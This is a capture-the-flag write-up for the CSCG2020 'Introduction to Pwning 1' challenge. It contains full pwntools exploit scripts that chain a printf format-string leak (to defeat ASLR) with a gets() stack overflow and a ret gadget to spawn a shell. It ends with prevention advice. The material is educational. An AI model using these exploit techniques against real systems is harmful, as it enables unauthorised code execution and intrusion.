# CSCG2020 - Introduction to Pwning 1 WriteUp
Author: @Tibotix

The Introduction to Pwning 1 is a Pwning challenge with difficulty "Baby".

To begin we are provided with a zip compressed file that contains all necessary challenge files and a docker-compose file. It turns out that we have to interact with an programm over the network , for example netcat, and the goal is to read the flag file which is stored on the server.
With the docker-compose file we can easily set up our own local server, so now lets go.


## Research
This challenge also provides us with the source code of the pwn1 programm which we interact with.

At the top we can see that the programm was compiled without the stack canary protection so we can smash the stack without problems.

``` C++
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

// pwn1: gcc pwn1.c -o pwn1 -fno-stack-protector
```

Next a few helper functions that we can ignore are declared and then the main logic of the programm is implemented.
We can find two functions, `welcome` and `AAAAAAAA`:

```C++
// --------------------------------------------------- MENU

void WINgardium_leviosa() {
    printf("┌───────────────────────┐\n");
    printf("│ You are a Slytherin.. │\n");
    printf("└───────────────────────┘\n");
    system("/bin/sh");
}

void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n");
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Hufflepuff! │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}

void AAAAAAAA() {
    char read_buf[0xff];
    
    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Hufflepuff!\n");
        _exit(0);
    }
}
// --------------------------------------------------- MAIN

void main(int argc, char* argv[]) {
	ignore_me_init_buffering();
	ignore_me_init_signal();

    welcome();
    AAAAAAAA();
}
```
You also should notice the `WINgardium_leviosa` function which obviously looked kinda like the "goal function" cause it spawns a new shell.
But this function gets never called.

***So our primary goal is to redirect code execution in order to gain a shell and read the "flag" file which is hosted on the target server hax1.allesctf.net:9100.***

## Exploitation

We obviously have a vulnerability in the `welcome` and `AAAAAAAA` function:

```C++
char read_buf[0xff];
gets(read_buf);
```
`gets` never checks the boundary of the buffer, so we can write more than `0xff` bytes and overwrite the return address of the current Stackframe.

My first thought was to overflow the return address in the `welcome` Stackframe to redirect code execution to `WINgardium_leviosa` but that turned out to be impossible without knowing the exact position of the `WINgardium_leviosa` function, cause everytime you run the programm, the address change.

That behaviour looks pretty much like ASLR, and a quick look at checksec verifies that ASLR, RELRO, and Stack execution protection are all enabled:

![alt text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/checksec_output.png?raw=true "checksec output")

URGG!! That I should had noticed before. But, anyway lets move on.

So we have to somehow dynamically get the address of `WINgardium_leviosa`, and use this information to overflow the return address in the `AAAAAAAA` Stackframe.

### Base Address Leak through Format String Exploit

Another vulnerability I noticed is the wrong usage of `printf` function in `welcome`, which allows us a Format String attack:

```C++
printf(read_buf);
```
From [OWASP](https://owasp.org/www-community/attacks/Format_string_attack "OWASP Format String"):
>The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way,
>the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that
>could compromise the security or the stability of the system.

and [Wikipedia](https://en.wikipedia.org/wiki/Uncontrolled_format_string "Wikipedia Format String"):

>The problem stems from the use of unchecked user input as the format string parameter in certain C functions that perform formatting, 
>such as printf(). A malicious user may use the %s and %x format tokens, among others, to print data from the call stack or possibly 
>other locations in memory. One may also write arbitrary data to arbitrary locations using the %n format token, which commands printf() 
>and similar functions to write the number of bytes formatted to an address stored on the stack.

**Our Goal with this Format String exploit is to somehow get the base address of the .code section, so that we can calculate the
address of the `WINgardium_leviosa` function relative to the base address**

But how can we get that base address? Well, we could read the return address of the current `welcome` Stackframe. That address points to an instruction in main and that address has an static offset to the base address. So the formula to calculate the base address would then be:

```Python
base_address = ret_addr - offset_ret_addr_to_base_addr
```

First let's read 50 addresses from the stack. The formatter `%p` expects a pointer from type `void*` so lets use this as our formatter.

First I've attached gdb to the server and set a breakpoint when calling the `printf` function:

![alt text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/printf_memory_inspection_breakpoint.png?raw=true "printf breakpoint")

Now I've send 50 times `%p ` over netcat to my local server and we hit the breakpoint in gdb.
Let's inspect the stack.

![alt text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/printf_memory_inspection.png?raw=true "printf stack inspection")

We can see that RDI, where the first argument for `printf`, the 50 `%p `'s, is stored, points at the top of the stack.
We also can see the return address to **`0x55981a9d6b21`** right after where rbp is pointing to.

Now continuing in gdb and look what we get as output from the fromat string.

![alt text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/format_memory_inspection_output.png?raw=true "format string output")

**OHH look! There is our return address `0x55981a9d6b21` !**
That's cool. Now lets calculate how many `%p `'s we must supply in order to get exactly the return address.
Well, you can simply count on which index `0x55981a9d6b21` in the output is, but let's practice some more math:-).

The distance from the start of the `read_buf` variable to the return address is 

```Python
>>> distance = 0x7ffe19d360d8 - 0x7ffe19d35fd0
>>> distance
264
```

Because half of this space is occupied by the `%p `'s and each is 3 bytes long, we get

```Python
>>> distance/2/3
44.0
```
Due to the calling convientions in 64-bit, we have to consider the registers, that also has an argument assigned:
- RSI
- RDX
- RCX
- R8
- R9

So finally, when we subtract these 5 registers, we get:

```Python
>>> distance/2/3-5
39.0
```

**Instead of writing 39 times `%p ` we can use the direct access formatter `%39$p`.**

Now we can read the return address. Lets get the offset from it to the base address.
To get the current base address we use `vmmap` in gdb:

![alt text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/base_address_vmmap.png?raw=true "vmmap base address lookup")

The last 12 bits have to be the offset.
Our previos return address was `0x55981a9d6b21`, so the offset is **`0xb21`** and thus the previos base address would have been `0x55981a9d6000`.

Now that we have a way to dynamically calculate the base address, we can easily calculate the address of `WINgardium_leviosa`, too.
Find the offset with objdump,

![alt_text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/WINgarduim_levosia_func_offset.png?raw=true "WINgardium_leviosa offset")

and the formula for calculating the `WINgardium_leviosa` function is:

```Python3
WINgardium_leviosa_location = base_address + 0x9ec
```

### Buffer Overflow in `AAAAAAAA`

To get the programm returning into the `WINgardium_leviosa` function, the `ret` instruction in `AAAAAAAA` must be executed.
But this only happens if the following if-case is true:

```C++
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
```

Otherwise the programm will exit and never reaches the `ret` instruction:

```C++
    } else {
        printf("-10 Points for Hufflepuff!\n");
        _exit(0);
    }
```

So how can we write more than just "Expelliarmus" in `read_buf` through `gets`, but at the same time trick `strcmp` into thinking it's really only "Expelliarmus" ? 

**NULL-Terminated Strings.**

In C every string is terminated by a NULL character `0x00`.
`strcmp` stops when encountering a NULL character, but `gets` stops only at a newline `\n`.
So we can craft our final payload like this:

```Python3
payload = "Expelliarmus\x00" + "A"*251 + WINgardium_leviosa_location
```

cause "Expelliarmus\x00" is `13` bytes long, the padding to the return address is `0xff+8(rbp)-13 = 251` bytes long.

Let's put this all together in a python3 programm. I am using pwntools for communication with the server:

```Python3
from pwn import *
import struct

p = remote('127.0.0.1', 1024)
print(p.recvline()) # Enter your witch name:\n

base_address_leak_payload = b'%39$p'
p.sendline(base_address_leak_payload)

print(p.recvline().decode('utf-8')) # ┌───────────────────────┐
print(p.recvline().decode('utf-8')) # │ You are a Hufflepuff! │
print(p.recvline().decode('utf-8')) # └───────────────────────┘

memory_leak = p.recvline().split(b' ') # [0x?????????????b21, 'enter', 'your', 'magic', 'spell:\n']
ret_addr = int(memory_leak[0], 16) # converting from string to hex
base_address = ret_addr - 0xb21
print('base_address: {0}'.format(hex(base_address)))

WINgardium_leviosa_location = struct.pack('Q', base_address + 0x9ec) # pack in 64-bits alligned
payload = "Expelliarmus\x00" + "A"*251 + WINgardium_leviosa_location

input('attach gdb')
p.sendline(payload)
p.interactive()
```

When we run this with gdb attached we can see our return address to `WINgardium_leviosa` is successfully injected:

![alt text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/first_payload_half_succes_stack.png?raw=true "successfully injected return address")

but when we continue gdb encounters an error:

![alt text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/do_system_crash.png?raw=true "do_system crash")

This is a bit strange cause we **successfully redirected code execution** to the `WINgardium_leviosa` function, but inside the `system("/bin/sh");` function call the program crashes..

Lets look at the instruction that causes the problem:

```Assembler
movaps xmmword ptr [rsp + 0x50], xmm0
```

From [MOVAPS Description](https://www.felixcloutier.com/x86/movaps "MOVAPS Description"):
>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version) boundary or a 
>general-protection exception (#GP) will be generated.

So the destination operand is `[rsp + 0x50]`, and is with rsp=`0x7fff4ab111d8` obviously not 16-byte aligned.

Now how we can change `rsp`?

There are multiple instructions that do this:
- `push` instruction
- `pop` instruction
- `call` instruction
- `ret` instruction
- `sub` rsp, 0x08
- `add` rsp, 0x08

Lets use a tiny rop chain to reduce `rsp` by using one other `ret` instruction.
For the first `ret` we simply use the `ret` from `AAAAAAAA` itself, so we basically jumping on point but reducing the stack.
The offset of this `ret` can simply be obtained 

![alt text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/AAAAAAAA_ret_instruction.png?raw=true "AAAAAAAA_ret_instruction")

and now we put this all together and get our final exploit script:

```Python
from pwn import *
import struct

p = remote('127.0.0.1', 1024)
print(p.recvline()) # Enter your witch name:\n

base_address_leak_payload = b'%39$p'
p.sendline(base_address_leak_payload)

print(p.recvline().decode('utf-8')) # ┌───────────────────────┐
print(p.recvline().decode('utf-8')) # │ You are a Hufflepuff! │
print(p.recvline().decode('utf-8')) # └───────────────────────┘

memory_leak = p.recvline().split(b' ') # [0x?????????????b21, 'enter', 'your', 'magic', 'spell:\n']
ret_addr = int(memory_leak[0], 16) # converting from string to hex
base_address = ret_addr - 0xb21
print('base_address: {0}'.format(hex(base_address)))

WINgardium_leviosa_location = struct.pack('Q', base_address + 0x9ec)
AAAAAAAA_ret_location = struct.pack('Q', base_address + 0xaf3)
shell_payload = b"Expelliarmus\x00" + b"A"*251 + AAAAAAAA_ret_location + WINgardium_leviosa_location

input('attach gdb')

p.sendline(shell_payload)
p.interactive()
```

When we run this script again , **it spawns a shell**:

![alt text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn1/successfull_exploit.png?raw=true "successfull exploit")

Now you only have to change the server and port address and you are good to go.

```Python
p = remote('hax1.allesctf.net', 9100)
...
...
...
```

## Prevention

This section covers a few prevention measures for the above discussed security issues.

### Format String Protection

Basically the best thing you can do to mitigate Format String exploits are the correct usage of `printf` **with formatters**:

```C++
printf("Hello, %s", name);
```
the compiler can help you find wrong usage of print-functions by turning on for example the `-Wformat` flag.

Also you always have to validate user-controlled input as this is generally a good idea and helps the prevention of Format String attacks, too.

Cause of the arbitrary read/write possibilities in Format String exploits you really should avoid these. The Buffer Overlow exploit in this challenge would be much more difficult to exploit without the Format String exploit to leak the base address and thus bypassing ASLR.

### Bufer Overflow Protection

To prevent Buffer Overflow attacks such as one just discussed, a good idea is to turn on all secutity protections especially the stack-cookie protector and ASLR, cause then the overwrite from rbp and return address is much more difficult.

Another approach is to use safe "buffer-reading" functions such as `fgets` that checks the boundary of the input buffer.
On C++, also only use the `strn-` versions as they provide a boundary check.

## Conclusion

This Challenge was really fun to me and I learned a lot. We used a Format String exploit to leak the base address and thus bypassing ASLR. Then we used a Buffer Overflow to redirect code execution to the wanted function.
I hope you now understood the exploit and techniques which we used and enjoyed this WriteUp.
